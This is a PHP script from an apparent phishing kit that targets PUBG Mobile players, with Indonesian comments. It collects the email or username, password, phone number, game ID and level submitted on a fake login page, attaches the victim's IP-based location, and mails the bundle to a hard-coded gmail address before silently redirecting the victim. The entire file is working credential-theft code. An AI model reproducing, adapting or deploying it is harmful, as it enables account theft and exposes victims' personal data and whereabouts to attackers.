<?php
// MENGAMBIL KONTROL
include 'geo.php';
include 'email.php';

$email = $_POST['email'];
$password = $_POST['password'];
$id = $_POST['id'];
$nickname = $_POST['nickname'];
$nope = $_POST['phone'];
$login = $_POST['login'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$ip = $_SERVER['REMOTE_ADDR'];

$country  = $khcodes['country'];
$region   = $khcodes['regionName'];
$city     = $khcodes['city'];
$lat      = $khcodes['lat'];
$long     = $khcodes['lon'];
$timezone = $khcodes['timezone'];
$ipAddr   = $khcodes['query'];

if($email == "" && $password == "" && $nickname == "" && $nope == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "PUBGM | LEVEL $level | LOGIN $login | NICK $nickname";
$pesan = '
<center> 
<div style="background: urlhttps://wallpapermemory.com/uploads/735/emilia-re-zero-wallpaper-full-hd-1920x1080-159299.jpg) no-repeat center center fixed; background-size: 100% 100%; width: 294; height: 100px; color: #009fff; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #009fff; width: 294; color: #fff; text-align: left; padding: 10px;">ACCOUNT INFORMATION</div>
<table style="border-collapse: collapse; border-color: #009fff; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ID NYA</th>
<th style="width: 78%; text-align: center;"><b>'.$id.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>NICKNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nickname.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$nope.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>RP LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$rpl.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIER</th>
<th style="width: 78%; text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>RP TYPE</th>
<th style="width: 78%; text-align: center;"><b>'.$rpt.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #009fff; width: 294; color: #fff; text-align: left; padding: 10px;">MORE INFORMATION</div>
<table style="border-collapse: collapse; border-color: #009fff; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$lat.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$long.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ipAddr.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ZONA WAKTU</th>
<th style="width: 78%; text-align: center;"><b>'.$timezone.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #009fff; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
</div>
<div style="text-align:center;font-weight: bold;">
Subscribe Hans Farhan
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: Subscribe Igo Galeri ['.$resultFlags.'] <igogaleri@gmail.com>' . "\r\n";

//$from    = 'igogaleri@gmail.com';
$to      = 'rizkipratama122019@gmail.com';
//$headers  = 'MIME-Version: 1.0' . "\r\n";
//$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
//$headers .=
//'From: ' . $from . "\r\n" .
//'Reply-To: ' . $from . "\r\n" .
//'X-Mailer: PHP/' . phpversion();
$kirim = mail($to, $subjek, $pesan, $headers);
if($kirim) {
echo "<form id='shagitz' method='POST' action='success.php'>
<input type='hidden' name='nickname' value='$nickname'>
</form>
<script type='text/javascript'>document.getElementById('shagitz').submit();</script>";
}
}
?>